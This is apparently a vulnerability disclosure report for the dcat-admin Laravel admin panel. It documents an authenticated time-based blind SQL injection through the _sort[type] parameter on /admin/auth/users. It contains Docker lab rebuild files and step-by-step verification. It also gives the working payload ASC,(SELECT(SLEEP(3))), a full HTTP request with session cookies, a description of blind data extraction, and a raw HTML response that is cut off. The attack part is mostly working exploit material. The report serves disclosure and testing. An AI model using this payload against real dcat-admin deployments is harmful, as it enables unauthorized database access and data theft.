### Vulnerability details

**Official website / Product:** https://github.com/jqhph/dcat-admin

**Repository:** jqhph/dcat-admin (stars at selection: 4019)

**Vulnerability type:** SQLi

**Vulnerability versions:** <= 2.2.3-beta / current `2.0` branch HEAD (`315658a8f9b0`)

**Vulnerability URL / Parameter:** `GET /admin/auth/users` — query parameters `_sort[column]`, `_sort[type]`, `_sort[cast]` (also affects other EloquentRepository grids such as `/admin/auth/roles`)

**Complex:** yes

### Verification procedure

1. Original `labs/dcat-admin-r59-a2` and image `dcat-admin-r59-a2:lab` were removed after audit. Rebuild an equivalent lab from the full files below (local `repos/dcat-admin` must be at commit `315658a8f9b079a3ff018ad386f3738869cb44bb`):
   ```bash
   mkdir -p labs/dcat-admin-r59-a2/app
   cd labs/dcat-admin-r59-a2
   # Write the docker-compose.yml / Dockerfile / entrypoint.sh below into this directory, then:
   chmod +x entrypoint.sh
   docker compose up -d --build
   # wait for http://127.0.0.1:23902/admin/auth/login
   ```
   Stack: `php:8.4-apache-bookworm` + `mysql:8.0`; host port **23902**; DB `dcat` / user `dcat` / password `dcatpass` (root/`rootpass`); entrypoint sets `APP_NAME=DcatLab` (session cookie name `dcatlab_session`), path-mounts `../../repos/dcat-admin` → `/opt/dcat-admin`, then `composer require dcat/laravel-admin:@dev` + `php artisan admin:install`.

```yaml
# Rebuild source for missing labs/dcat-admin-r59-a2 (image dcat-admin-r59-a2:lab was removed).
# Place these three files under labs/dcat-admin-r59-a2/, ensure repos/dcat-admin is at
# commit 315658a8f9b079a3ff018ad386f3738869cb44bb, then: mkdir -p app && docker compose up -d --build
services:
  db:
    image: mysql:8.0
    environment:
      MYSQL_DATABASE: dcat
      MYSQL_USER: dcat
      MYSQL_PASSWORD: dcatpass
      MYSQL_ROOT_PASSWORD: rootpass
    command: --default-authentication-plugin=mysql_native_password --character-set-server=utf8mb4
    volumes:
      - dbdata:/var/lib/mysql
    healthcheck:
      test: ["CMD", "mysqladmin", "ping", "-h", "127.0.0.1", "-uroot", "-prootpass"]
      interval: 5s
      timeout: 5s
      retries: 40

  app:
    build: .
    image: dcat-admin-r59-a2:lab
    ports:
      - "23902:80"
    volumes:
      - ./app:/var/www/html
      - ../../repos/dcat-admin:/opt/dcat-admin:ro
    environment:
      APP_DEBUG: "true"
      DB_HOST: db
      DB_DATABASE: dcat
      DB_USERNAME: dcat
      DB_PASSWORD: dcatpass
    depends_on:
      db:
        condition: service_healthy

volumes:
  dbdata:
```

```dockerfile
FROM php:8.4-apache-bookworm
ARG http_proxy
ARG https_proxy
ENV http_proxy=${http_proxy}
ENV https_proxy=${https_proxy}
ENV HTTP_PROXY=${http_proxy}
ENV HTTPS_PROXY=${https_proxy}
RUN apt-get update && apt-get install -y git unzip libzip-dev libpng-dev libonig-dev libxml2-dev \
    && docker-php-ext-install pdo_mysql mysqli zip gd bcmath \
    && a2enmod rewrite \
    && curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer
ENV COMPOSER_ALLOW_SUPERUSER=1
ENV http_proxy= https_proxy= HTTP_PROXY= HTTPS_PROXY=
WORKDIR /var/www/html
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]
CMD ["apache2-foreground"]
```

```bash
#!/bin/bash
set -e
cd /var/www/html
if [ ! -f artisan ]; then
  echo "[*] Creating Laravel project..."
  composer create-project laravel/laravel:^10.0 /tmp/laravel --no-interaction --prefer-dist
  shopt -s dotglob
  mv /tmp/laravel/* /var/www/html/
  rmdir /tmp/laravel || true
fi

# Path-repo for local dcat-admin (mount ../../repos/dcat-admin -> /opt/dcat-admin)
composer config repositories.dcat path /opt/dcat-admin
composer config minimum-stability dev
composer config prefer-stable true

if ! composer show dcat/laravel-admin >/dev/null 2>&1; then
  echo "[*] Installing dcat/laravel-admin from path..."
  composer require dcat/laravel-admin:@dev --no-interaction --with-all-dependencies || true
fi

if [ ! -f .env ]; then
  cp .env.example .env
fi
php -r "
\$env=file_get_contents('.env');
\$env=preg_replace('/^APP_NAME=.*/m','APP_NAME=DcatLab',\$env);
\$env=preg_replace('/^APP_DEBUG=.*/m','APP_DEBUG=true',\$env);
\$env=preg_replace('/^DB_CONNECTION=.*/m','DB_CONNECTION=mysql',\$env);
\$env=preg_replace('/^DB_HOST=.*/m','DB_HOST=db',\$env);
\$env=preg_replace('/^DB_PORT=.*/m','DB_PORT=3306',\$env);
\$env=preg_replace('/^DB_DATABASE=.*/m','DB_DATABASE=dcat',\$env);
\$env=preg_replace('/^DB_USERNAME=.*/m','DB_USERNAME=dcat',\$env);
\$env=preg_replace('/^DB_PASSWORD=.*/m','DB_PASSWORD=dcatpass',\$env);
\$env=preg_replace('/^APP_URL=.*/m','APP_URL=http://127.0.0.1:23902',\$env);
file_put_contents('.env',\$env);
"

if ! grep -q '^APP_KEY=base64:' .env 2>/dev/null; then
  php artisan key:generate --force || true
fi

php artisan vendor:publish --provider="Dcat\Admin\AdminServiceProvider" --force || true
php artisan migrate --force || true
php artisan admin:install --force 2>/dev/null || php artisan admin:install || true

if [ -d public ]; then
  sed -i 's!DocumentRoot /var/www/html!DocumentRoot /var/www/html/public!' /etc/apache2/sites-available/000-default.conf
  sed -i 's!<Directory /var/www/html>!<Directory /var/www/html/public>!' /etc/apache2/sites-available/000-default.conf || true
  if ! grep -q 'AllowOverride All' /etc/apache2/sites-available/000-default.conf; then
    sed -i '/DocumentRoot/a\\t<Directory /var/www/html/public>\n\t\tAllowOverride All\n\t\tRequire all granted\n\t</Directory>' /etc/apache2/sites-available/000-default.conf
  fi
  chown -R www-data:www-data storage bootstrap/cache public || true
  chmod -R 777 storage bootstrap/cache || true
fi

echo "[*] dcat-admin lab ready on :80"
exec "$@"
```

Expected `docker compose ps` shape (as recorded during audit):

```text
NAME                      IMAGE                   COMMAND                  SERVICE   CREATED              STATUS                        PORTS
dcat-admin-r59-a2-app-1   dcat-admin-r59-a2:lab   "/entrypoint.sh apac…"   app       About a minute ago   Up About a minute             0.0.0.0:23902->80/tcp, [::]:23902->80/tcp
dcat-admin-r59-a2-db-1    mysql:8.0               "docker-entrypoint.s…"   db        About a minute ago   Up About a minute (healthy)   3306/tcp, 33060/tcp
```
2. Open `http://127.0.0.1:23902/admin/auth/login` and log in with default credentials `admin` / `admin`. Capture `XSRF-TOKEN` and `dcatlab_session` cookies from the response (PoC cookie values are session-specific — replace with a fresh login).
3. (Optional, for general_log corroboration) enable logging in the DB container:
   `docker exec dcat-admin-r59-a2-db-1 mysql -uroot -prootpass -e "SET GLOBAL general_log=1; SET GLOBAL log_output='TABLE';"`
4. Send the PoC GET below against `/admin/auth/users` while authenticated.
5. Observe ~3 second response delay vs ~0.02s baseline (measured baseline `0.021840`, SLEEP(3) `3.025534`).
6. Confirm MySQL `general_log` contains the injected clause: `order by CAST(\`id\` AS SIGNED) ASC,(SELECT(SLEEP(3)))`.
7. Blind extract `SUBSTR(VERSION(),1,1)='8'` (sleep) vs `'9'` (no sleep) to prove data-dependent SQL execution.

### Complete vulnerability PoC

URL-decoded query string: `_sort[column]=id&_sort[type]=ASC,(SELECT(SLEEP(3)))&_sort[cast]=SIGNED` (when `cast` is non-empty, sink uses `orderByRaw("CAST({column} AS {cast}) {type}")`, interpolating attacker-controlled `type` into raw SQL).

Complete HTTP request (Docker-verified):

```http
GET /admin/auth/users?_sort%5Bcolumn%5D=id&_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&_sort%5Bcast%5D=SIGNED HTTP/1.1
Host: 127.0.0.1:23902
User-Agent: curl/8.22.0
Accept: */*
Cookie: XSRF-TOKEN=eyJpdiI6ImhZUXM4SGVnckhoZEVCZ2tjdmpwbnc9PSIsInZhbHVlIjoiU0hmdDZMUTlNRDZkaVVGZ2tiNjFTUUNOMTJmaStVK3hVZERJS25aTlUrejVrZHVHc2JpTncvQm41RVA2SkNBeWM5d1prd3lmL29xM0lxY0lyR1hIbkk2NEdrbDVBTFQvWFBUcUVBdnBiM1RwNWF2cVpHNUZTMldTZmVGdE5ka24iLCJtYWMiOiJhY2U4YzNjMjkwOWVkMTNmY2ViZGE4NzcxNGIxMDBhMjk2MjU0NWRmNDZhMGUwNzk4Y2UyODAyNGVhNWZmODQzIiwidGFnIjoiIn0%3D; dcatlab_session=eyJpdiI6IlY5bGE1ckI5WUxEWUpjK0xhS0xkdFE9PSIsInZhbHVlIjoieWJOdldzNGFwVFlZT2plak1BL0IxaXNVREFSZ2x6Y3hPekVLNjdyWTJBdFJocDZxWHBycHREWUhtWXkzWm81aXo0Nmx0SlYzV3BHajdWa3ZOL1JvSFZHMjNOcXdBdVBIT1lpckIxQ2dzWFJad0RLOEZIQ0hDT1ZBWG9xTzJ5RE0iLCJtYWMiOiIwNzE3NDczNzA4OTVjNmJjMjczYWNhOTgyZDMwYmVkOWM5N2FjMzNlYzBmNTIxMzUzMmRmMTkzZGJkNmIzOGU3IiwidGFnIjoiIn0%3D
Connection: close


```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 13:42:55 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.4.27
Cache-Control: no-cache, private
Set-Cookie: XSRF-TOKEN=eyJpdiI6IkFKNy85eUZqMklYSS8raC9WczJuMmc9PSIsInZhbHVlIjoia28zV0pJL1BNRzdORGpzQm5FNzRDOStmbUxqenFCcXBFUWc4TlNVVldFcVpJT3BDeE5GQ0pXaEhvOVV5S3c4Zy9RV0pmY21UcUJTMVZhSXZVb3dSOHdtRnkrb0ppVjNxa0V0a2VKTUMvZVNSUDdqRnJrVnhpZE1vRHAvZG4vd1ciLCJtYWMiOiI0ODIzMGFiNThlNmE5NjQzNzljZGU5Mzk4Yjk5N2U2YWE5MTU3MGI1MzFiZmYxMGYzMzhjYTBmZjI5NDhhZDc0IiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 15:42:58 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: dcatlab_session=eyJpdiI6IkxZT2QwZFM3SDdmUkdxcVZLdnRzMUE9PSIsInZhbHVlIjoiaVVWQS94TWVXL3dPNmpUQ1VhbnRPM0RNeXRYSzVFNVRZZnV0b3d6MFBEelhCRm1LZTdsOFhJckNNc0xQR0NGd09MVzhyVzNJbEtmVFBDTWZNUTE4U20yeTN4blo2ZVBRc1M2bmpicHFpNTFZZ1FlSXZMczlJd3pCUFRhaCtTcksiLCJtYWMiOiJjYjdlN2NlOGZjMDE3MzhjZTUxNDA1M2Q5ZWQyOTUzMzQ0ZDkyYmM2MjA1MjMwOWY3ZTFlZTIzZGU0OWQ2NDhjIiwidGFnIjoiIn0%3D; expires=Mon, 02 Nov 2026 15:42:58 GMT; Max-Age=7200; path=/; httponly; samesite=lax
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1,IE=edge">
    
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">

    <title>Administrator |  Admin</title>

            <meta name="referrer" content="no-referrer"/>
    
    
    

    <script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/vendors.min.js?v2.2.2-beta"></script><script src="http://127.0.0.1:23902/vendor/dcat-admin/dcat/js/dcat-app.js?v2.2.2-beta"></script>

    <link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/adminlte/adminlte.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/vendors.min.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/extensions/toastr.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/tables/datatable/datatables.min.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/css/dcat-app.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/css/nunito.css?v2.2.2-beta"><link rel="stylesheet" href="http://127.0.0.1:23902/vendor/dcat-admin/dcat/plugins/jstree-theme/themes/proton/style.min.css?v2.2.2-beta">
</head>



<body
        class="dcat-admin-body sidebar-mini layout-fixed  
        navbar-fixed-top " >

<script>
    var Dcat = CreateDcat({"pjax_container_selector":"#pjax-container","token":"jRm6LZ0qE5GMk5UhqBAAO1SN9HOfVFz5GrXVJsFH","lang":{"delete_confirm":"Are you sure to delete this item ?","confirm":"Confirm","cancel":"Cancel","refresh_succeeded":"Refresh succeeded !","close":"Close","selected_options":":num options selected","exceed_max_item":"Maximum items exceeded.","no_preview":"No preview available.","0":"Internal server error !","1":"Permission deny !","2":"Unauthorized !","3":"Page expired !"},"colors":{"info":"#3085d6","success":"#21b978","danger":"#ea5455","warning":"#dda451","indigo":"#5c6bc6","blue":"#3085d6","red":"#ea5455","orange":"#dda451","green":"#21b978","cyan":"#7367f0","purple":"#5b69bc","custom":"#59a9f8","pink":"#ff8acc","dark":"#22292f","white":"#fff","white50":"hsla(0,0%,100%,.5)","blue1":"#007ee5","blue2":"#3d97dd","orange1":"#ffcc80","orange2":"#F99037","yellow":"#edc30e","indigo-darker":"#495abf","red-darker":"#bd4147","blue-darker":"#236bb0","cyan-darker":"#6355ee","gray":"#b9c3cd","light":"#f7f7f9","tear":"#01847f","tear1":"#00b5b5","dark20":"#f6fbff","dark30":"#f4f7fa","dark35":"#e7eef7","dark40":"#ebf0f3","dark50":"#d3dde5","dark60":"#bacad6","dark70":"#b3b9bf","dark80":"#7c858e","dark85":"#5c7089","dark90":"#252d37","font":"#414750","gray-bg":"#f1f1f1","border":"#ebeff2","input-border":"#d9d9d9","background":"#eff3f8","dark-mode-bg":"#2c2c43","dark-mode-color":"#222233","dark-mode-color2":"#1e1e2d","dark-mode-font":"##a8a9bb","primary":"#586cb1","primary-darker":"#4c60a3","link":"#4c60a3"},"dark_mode":false,"sidebar_dark":false,"sidebar_light_style":"sidebar-light-primary"});
</script>



<div class="wrapper">
    <div class="main-menu">
    <div class="main-menu-content">
        <aside class="main-sidebar shadow sidebar-light-primary">

                        <div class="navbar-header">
                <ul class="nav navbar-nav flex-row">
                    <li class="nav-item mr-auto">
                        <a href="http://127.0.0.1:23902/admin" class="navbar-brand waves-effect waves-light">
                            <span class="logo-mini"><img src="/vendor/dcat-admin/images/logo.png"></span>
                            <span class="logo-lg"><img src="/vendor/dcat-admin/images/logo.png" width="35"> &nbsp;Dcat Admin</span>
                        </a>
                    </li>
                </ul>
            </div>
            
            <div class="p-0 sidebar pb-3">
                <ul class="nav nav-pills nav-sidebar flex-column"
                    data-widget="treeview"
                     style="padding-top: 10px">
                    

                    <li class="nav-item">
            <a data-id="1"                href="http://127.0.0.1:23902/admin"
               class="nav-link ">
                <i class="fa fa-fw feather icon-bar-chart-2"></i>
                <p>
                    Index
                </p>
            </a>
        </li>
    <li class="has-treeview  nav-item menu-open">
            <a href="#"  data-id="2"
               class="nav-link 
                    ">
                <i class="fa fa-fw feather icon-settings"></i>
                <p>
                    Admin

                                            <i class="right fa fa-angle-left"></i>
                                    </p>
            </a>
            <ul class="nav nav-treeview">
                                    
                    <li class="nav-item">
            <a data-id="3"                href="http://127.0.0.1:23902/admin/auth/users"
               class="nav-link active">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Users
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="4"                href="http://127.0.0.1:23902/admin/auth/roles"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Roles
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="5"                href="http://127.0.0.1:23902/admin/auth/permissions"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Permission
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="6"                href="http://127.0.0.1:23902/admin/auth/menu"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Menu
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="7"                href="http://127.0.0.1:23902/admin/auth/extensions"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Extensions
                </p>
            </a>
        </li>
                                </ul>
        </li>
    

                    <li class="has-treeview  nav-item ">
            <a href="#"  data-id="1"
               class="nav-link 
                    ">
                <i class="fa fa-fw fa fa-keyboard-o"></i>
                <p>
                    Helpers

                                            <i class="right fa fa-angle-left"></i>
                                    </p>
            </a>
            <ul class="nav nav-treeview">
                                    
                    <li class="nav-item">
            <a data-id="2"                href="http://127.0.0.1:23902/admin/auth/extensions"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Extensions
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="3"                href="http://127.0.0.1:23902/admin/helpers/scaffold"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Scaffold
                </p>
            </a>
        </li>
                                        
                    <li class="nav-item">
            <a data-id="4"                href="http://127.0.0.1:23902/admin/helpers/icons"
               class="nav-link ">
                &nbsp;<i class="fa fa-fw feather icon-circle"></i>
                <p>
                    Icons
                </p>
            </a>
        </li>
                                </ul>
        </li>
    
                </ul>
            </div>
        </aside>
    </div>
</div>
    <nav class="header-navbar navbar-expand-lg navbar
    navbar-with-menu fixed-top
    
        navbar-light navbar-shadow " style="top: 0;">

    <div class="navbar-wrapper">
        <div class="navbar-container content">
                        <div class="mr-auto float-left bookmark-wrapper d-flex align-items-center">
                <ul class="nav navbar-nav">
                    <li class="nav-item mr-auto">
                        <a class="nav-link menu-toggle" data-widget="pushmenu" style="cursor: pointer;">
                            <i class="fa fa-bars font-md-2"></i>
                        </a>
                    </li>
                </ul>
            </div>
            
            <div class="navbar-collapse d-flex justify-content-between">
                <div class="navbar-left d-flex align-items-center">
                    
                </div>

                
                <div class="navbar-right d-flex align-items-center">
                    

                    <ul class="nav navbar-nav">
                        
                        <li class="dropdown dropdown-user nav-item">
    <a class="dropdown-toggle nav-link dropdown-user-link" href="#" data-toggle="dropdown">
        <div class="user-nav d-sm-flex d-none">
            <span class="user-name text-bold-600">Administrator</span>
            <span class="user-status"><i class="fa fa-circle text-success"></i> Online</span>
        </div>
        <span>
            <img class="round" src="http://127.0.0.1:23902/vendor/dcat-admin/images/default-avatar.jpg" alt="avatar" height="40" width="40" />
        </span>
    </a>
    <div class="dropdown-menu dropdown-menu-right">
        <a href="http://127.0.0.1:23902/admin/auth/setting" class="dropdown-item">
            <i class="feather icon-user"></i> Setting
        </a>

        <div class="dropdown-divider"></div>

        <a class="dropdown-item" href="http://127.0.0.1:23902/admin/auth/logout">
            <i class="feather icon-power"></i> Logout
        </a>
    </div>
</li>


                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>


    <div class="app-content content">
        <div class="content-wrapper" id="pjax-container" style="top: 0;min-height: 900px;">
                <style></style>

    <div class="content-header">
            <section class="content-header breadcrumbs-top">
                    <h1 class=" float-left">
                <span class="text-capitalize">Administrator</span>
                <small>List</small>
            </h1>
        
        <div class="breadcrumb-wrapper col-12">
    <ol class="breadcrumb float-right text-capitalize">
        <li class="breadcrumb-item"><a href="http://127.0.0.1:23902/admin"><i class="fa fa-dashboard"></i> home</a></li>
                    <li class="breadcrumb-item">
                                auth
                            </li>
                    <li class="breadcrumb-item">
                 <a href="">                 users
                 </a>             </li>
            </ol>
    </div>

<div class="clearfix"></div>

    </section>
    </div>

    <div class="content-body" id="app">
        
        

                
    <div class="row "><div class="col-md-12"><div class="dcat-box">

    <div class="d-block pb-0">
        <div class="custom-data-table-header">
        <div class="table-responsive">
            <div class="top d-block clearfix p-0">
                                    <div class="btn-group dropdown grid-select-all-btn" style="display:none;margin-right: 3px;z-index: 100">
    <button type="button" class="btn btn-white dropdown-toggle btn-mini btn-outline" data-toggle="dropdown">
        <span class="d-none d-sm-inline selected"></span>
        <span class="caret"></span>
        <span class="sr-only"></span>
    </button>
    <ul class="dropdown-menu" role="menu">
                                    <li class="dropdown-item">
                    <a data-name="" data-action="batch-delete" data-redirect="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED" data-url="http://127.0.0.1:23902/admin/auth/users"><i class="feather icon-trash"></i> Delete</a>
                </li>
                        </ul>
</div> <button data-action="refresh" class="btn btn-primary grid-refresh btn-mini btn-outline" style="margin-right:3px">
    <i class="feather icon-refresh-cw"></i><span class="d-none d-sm-inline">&nbsp; Refresh</span>
</button>   <style>::-ms-clear,::-ms-reveal{display: none;}</style>

<form pjax-container action="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&_sort%5Bcast%5D=SIGNED" class="input-no-border quick-search-form d-md-inline-block" style="display:none;margin-right: 16px">
    <div class="table-filter">
        <label style="width: 18rem">
            <input
                    type="search"
                    class="form-control form-control-sm quick-search-input"
                    placeholder="Search"
                    name="_search_"
                    value=""
                    auto="1"
            >
        </label>
    </div>
</form>


                    <div class="pull-right" data-responsive-table-toolbar="grid-table">
                        <span class="dropdown column-selector">
    <button class="btn btn-primary btn-outline dropdown-toggle" data-toggle="dropdown">
        <i class="fa fa-table"></i>
        <span class="caret"></span>
    </button>
    <ul class="dropdown-menu" role="menu" style="min-width: 155px">
        <li class="dropdown-item">
            <ul class="selectors">
                <div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="1" name="_all_" type="checkbox" class=" Dcat_Admin_Widgets_Checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>All</span>
            </div>
            </ul>
        </li>
        <li class="dropdown-divider">
        <li class="dropdown-item">
            <ul class="selectors">
                <div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="id" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>ID</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="username" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>username</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="name" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>name</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="roles" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>roles</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="permissions" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>permissions</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="created_at" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>created at</span>
            </div><div class="vs-checkbox-con vs-checkbox-primary" style="margin-right: 16px">
        <input value="updated_at" class="column-select-item Dcat_Admin_Widgets_Checkbox" type="checkbox" checked>
        <span class="vs-checkbox vs-checkbox-">
          <span class="vs-checkbox--check">
            <i class="vs-icon feather icon-check"></i>
          </span>
        </span>
                <span>updated at</span>
            </div>
            </ul>
        </li>
    </ul>
</span>
                        <button data-url='http://127.0.0.1:23902/admin/auth/users/create' class="btn btn-primary dialog-create btn-outline"><i class="feather icon-plus"></i><span class="d-none d-sm-inline">&nbsp; New</span></button>
                        
                    </div>
                            </div>
        </div>
    </div>
    </div>

    

    

    <div class="table-responsive table-wrapper complex-container table-middle mt-1 table-collapse ">
        <table class="table custom-data-table data-table" id="grid-table" >
            <thead>
                        <tr>
                                    <th ><div class="vs-checkbox-con vs-checkbox-primary checkbox-grid checkbox-grid-header">
    <input type="checkbox" class="select-all grid-select-all">
    <span class="vs-checkbox"><span class="vs-checkbox--check"><i class="vs-icon feather icon-check"></i></span></span>
</div></th>
                                    <th >ID<span class='grid-column-header'>&nbsp;<a href='http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&_sort%5Btype%5D=desc' class='grid-sort feather icon-arrow-down active'></a></span></th>
                                    <th >username</th>
                                    <th >name</th>
                                    <th >roles</th>
                                    <th >permissions</th>
                                    <th >created at</th>
                                    <th >updated at<span class='grid-column-header'>&nbsp;<a href='http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=updated_at&_sort%5Btype%5D=desc' class='grid-sort feather icon-arrow-down '></a></span></th>
                                    <th class="grid__actions__">Action</th>
                            </tr>
            </thead>

            
            <tbody>
                            <tr >
                                            <td ><div class="vs-checkbox-con vs-checkbox-primary checkbox-grid checkbox-grid-column">
    <input type="checkbox" class="grid-row-checkbox" data-id="1"   data-label="Administrator">
    <span class="vs-checkbox"><span class="vs-checkbox--check"><i class="vs-icon feather icon-check"></i></span></span>
</div>        </td>
                                            <td >1</td>
                                            <td >admin</td>
                                            <td >Administrator</td>
                                            <td ><span class='label' style='background:#586cb1'>Administrator</span></td>
                                            <td ><a href="javascript:void(0)" class="grid-dialog-tree" data-url="" data-title="permissions" data-checked="1" data-val="">
    <i class="feather icon-align-right"></i> View
</a></td>
                                            <td >2026-11-02 13:40:21</td>
                                            <td >2026-11-02 13:40:21</td>
                                            <td class="grid__actions__" ><div class="grid-dropdown-actions dropdown">
    <a href="#" style="padding:0 10px;" data-toggle="dropdown">
        <i class="feather icon-more-vertical"></i>
    </a>
    <ul class="dropdown-menu" style="left: -65px;">

                    <li class="dropdown-item"><a style="cursor: pointer;" class="act-yygs23RbX4h6d7JU" href="http://127.0.0.1:23902/admin/auth/users/1" ><i class="feather icon-eye"></i> Show &nbsp;&nbsp;</a></li>
                    <li class="dropdown-item"><a data-url="http://127.0.0.1:23902/admin/auth/users/1/edit" style="cursor: pointer;" class="quick-edit" href="javascript:void(0)" ><i class="feather icon-edit"></i> Quick Edit &nbsp;&nbsp;</a></li>
        
            </ul>
</div>
</td>
                                    </tr>
                                    </tbody>
        </table>
    </div>

    

    <div class="box-footer d-block clearfix ">
        <span class='d-none d-sm-inline' style="line-height:33px;color:#7c858e">Showing <b>1</b> to <b>1</b> of <b>1</b> entries</span><ul class="pagination pagination-sm no-margin pull-right shadow-100" style="border-radius: 1.5rem">
    <!-- Previous Page Link -->
        <li class="page-item previous disabled"><span class="page-link"></span></li>
    
                <!-- "Three Dots" Separator -->
        
        <!-- Array Of Links -->
                                                    <li class="page-item active"><span class="page-link">1</span></li>
                                            
    <!-- Next Page Link -->
        <li class="page-item next disabled"><span class="page-link"></span></li>
    </ul>
<label class="pull-right d-none d-sm-inline per-pages-selector" style="margin-right: 10px">
    <span class="dropup" style="display:inline-block">
        <a id="" class="dropdown-toggle btn btn-sm btn-white waves-effect" style="" data-toggle="dropdown" href="javascript:void(0)">
            <stub>20</stub>
            <span class="caret"></span>
        </a>
        <ul class="dropdown-menu"><li class="dropdown-item"><a href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=10">10</a></li><li class="dropdown-item"><a href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=20">20</a></li><li class="dropdown-item"><a href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=30">30</a></li><li class="dropdown-item"><a href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=50">50</a></li><li class="dropdown-item"><a href="http://127.0.0.1:23902/admin/auth/users?_sort%5Bcolumn%5D=id&amp;_sort%5Btype%5D=ASC%2C%28SELECT%28SLEEP%283%29%29%29&amp;_sort%5Bcast%5D=SIGNED&amp;per_page=100">100</a></li><li class="dropdown-item"><a 